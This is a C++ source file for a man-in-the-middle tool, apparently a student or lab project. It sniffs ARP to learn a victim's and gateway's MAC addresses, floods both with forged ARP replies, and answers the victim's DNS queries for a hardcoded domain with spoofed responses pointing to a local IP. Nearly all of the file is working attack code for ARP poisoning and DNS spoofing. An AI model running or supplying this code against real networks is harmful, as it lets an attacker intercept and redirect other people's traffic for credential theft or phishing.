#include "main.h"

#include <iostream>
#include <unordered_map>
#include <vector>

#include <stdio.h>
#include <unistd.h>

#include "Config.h"
#include "dns.h"

#include <fstream>
#include <sstream>

inline bool isSameMac(const unsigned char *a, const unsigned char *b) {
    for (int i = 0; i < ETH_ALEN; i++) {
        if (a[i] != b[i]) {
            return false;
        }
    }

    return true;
}

inline bool isSameQuestion(const unsigned char *a, const unsigned char *b) {
    for (int i = 0; a[i]; i++) {
        if (a[i] != b[i]) {
            return false;
        }
    }

    return true;
}

int main(int argc, const char *argv[]) {
    // Read strings from config file
    std::unordered_map<std::string, std::string> properties = getConfig("poisoner.conf");
    std::unordered_map<std::string, std::string> domainsToPoison = getConfig("spoofed_domains.conf");

    // convert all the values from the config file to the correct format
    unsigned char attackerMac[ETH_ALEN];

    struct in_addr victimIp;
    struct in_addr gatewayIp;
    unsigned char *victimIpChar = (unsigned char *)&victimIp;
    unsigned char *gatewayIpChar = (unsigned char *)&gatewayIp;
    const char *tmp;

    tmp = properties["attackerMac"].c_str();
    if (sscanf(tmp, "%x:%x:%x:%x:%x:%x", &attackerMac[0],
               &attackerMac[1], &attackerMac[2], &attackerMac[3], &attackerMac[4],
               &attackerMac[5]) != 6) {
        std::cerr << "could not parse attackerMac" << std::endl;
        return 0;
    }

    tmp = properties["victimIp"].c_str();
    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &victimIpChar[0], &victimIpChar[1],
               &victimIpChar[2], &victimIpChar[3]) != 4) {
        std::cerr << "could not parse victimIp" << std::endl;
        return 0;
    }

    tmp = properties["gatewayIp"].c_str();
    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &gatewayIpChar[0], &gatewayIpChar[1],
               &gatewayIpChar[2], &gatewayIpChar[3]) != 4) {
        std::cerr << "could not parse gatewayIp" << std::endl;
        return 0;
    }

    // get the mac addresses using arp
    bool victimMacSet = false;
    bool gatewayMacSet = false;
    unsigned char victimMac[ETH_ALEN];
    unsigned char gatewayMac[ETH_ALEN];
    NetworkEngine ipEngine(properties["interfaceName"].c_str());

    // start arp sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            struct arp_header *arp = (struct arp_header *)(packet + 14);

            if (ntohs(arp->arp_hd) == ARPHRD_ETHER && ntohs(arp->arp_pr) == ETH_P_IP) {
                struct in_addr *tmp = (struct in_addr *)arp->arp_spa;
                if (tmp->s_addr == victimIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        victimMac[i] = arp->arp_sha[i];
                    }
                    victimMacSet = true;
                    std::cout << "victim mac acquired" << std::endl;
                }

                if (tmp->s_addr == gatewayIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        gatewayMac[i] = arp->arp_sha[i];
                    }
                    gatewayMacSet = true;
                    std::cout << "gateway mac acquired" << std::endl;
                }
            }
        });
    std::cout << "starting arp sniff" << std::endl;
    ipEngine.startSniff("arp");
    std::cout << "arp sniff started" << std::endl;

    struct arp_header arpRequestVictim;
    struct arp_header arpRequestGateway;
    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestVictim);
    craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestGateway);

    // stop sniffing for macs once they have been found
    while (true) {
        if (!victimMacSet) {
            // send arp request to get mac address of victim
            std::cout << "requesting victim mac" << std::endl;
            ipEngine.sendArp(arpRequestVictim);
        }

        if (!gatewayMacSet) {
            // send arp request to get the mac address of gateway
            std::cout << "requesting gateway mac" << std::endl;
            ipEngine.sendArp(arpRequestGateway);
        }

        if (victimMacSet && gatewayMacSet) {
            std::cout << "stopping arp sniff" << std::endl;
            ipEngine.stopSniff();
            std::cout << "arp sniff has stopped" << std::endl;
            break;
        }

        sleep(2);
    }

    // start dns sniffing
    std::cout << "starting dns sniff" << std::endl;

    struct DnsSniffArgs dnsSniffArgs;
    dnsSniffArgs.net = &ipEngine;
    dnsSniffArgs.victimIp = &victimIp;
    dnsSniffArgs.gatewayIP = &gatewayIp;
    std::thread dnsThread(dnsSpoof, &dnsSniffArgs);

    std::cout << "dns sniffing started" << std::endl;

    // start arp poisoning
    struct arp_header victimArp;
    struct arp_header gatewayArp;
    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    // infinite arp loop
    while (true) {
        ipEngine.sendArp(victimArp);
        ipEngine.sendArp(gatewayArp);
        sleep(5);
    }

    dnsThread.join();
    return 0;
}

void dnsSpoof(struct DnsSniffArgs *args) {
    int i;

    pcap_t *session;
    pcap_if_t *allDevs;
    pcap_if_t *temp;

    struct bpf_program filterProgram;
    bpf_u_int32 netAddr = 0;

    char errBuff[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&allDevs, errBuff) == -1) {
        std::cerr << "pcap_findallDevs: " << errBuff << std::endl;
        return;
    }

    for (i = 0, temp = allDevs; temp; temp = temp->next, ++i) {
        if (!(temp->flags & PCAP_IF_LOOPBACK)) {
            break;
        }
    }

    session = pcap_open_live(temp->name, BUFSIZ, 0, 1, errBuff);
    if (!session) {
        std::cerr << "Could not open device: " << errBuff << std::endl;
        return;
    }

    if (pcap_compile(session, &filterProgram, "udp and dst port domain", 0, netAddr)) {
        std::cerr << "Error calling pcap_compile" << std::endl;
        return;
    }

    if (pcap_setfilter(session, &filterProgram) == -1) {
        std::cerr << "Error setting filter" << std::endl;
        return;
    }

    args->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)args);
    close(args->rawSocket);

    pcap_freealldevs(allDevs);
}

void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                  const unsigned char *packet) {
    struct DnsSniffArgs *params = (struct DnsSniffArgs *)args;

    // tmp fake spoofing address
    struct in_addr spoofIp;
    spoofIp.s_addr = 0x1300a8c0;
    unsigned char addressFilter[] = {0x09, 'm', 'i', 'l', 'l', 'i',  'w', 'a', 'y', 's',
                                     0x04, 'b', 'c', 'i', 't', 0x02, 'c', 'a', 0x00};

    struct iphdr *ip;
    struct udphdr *udp;
    dnshdr *dns;

    // get headers
    ip = (iphdr *)(packet + 14);
    udp = (udphdr *)(packet + 14 + 20);
    dns = (dnshdr *)(packet + 14 + 20 + 8);

    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = udp->dest;
    sin.sin_addr.s_addr = ip->saddr;

    bool isTarget = isSameQuestion(addressFilter, query);

    if (dns->qr == DNS_QUERY && ip->saddr == params->victimIp->s_addr && isTarget) {
        int responseSize = forgeDns(dns, &spoofIp, params->buffer + 20 + 8);
        fillIpUdpHeader(params->buffer, ip->daddr, ip->saddr, udp->dest, udp->source,
                        responseSize);
        sendto(params->rawSocket, params->buffer, 20 + 8 + responseSize, 0,
                           (struct sockaddr *)&sin, sizeof(sin));
        std::cout << "poisoning response" << std::endl;
    }
}
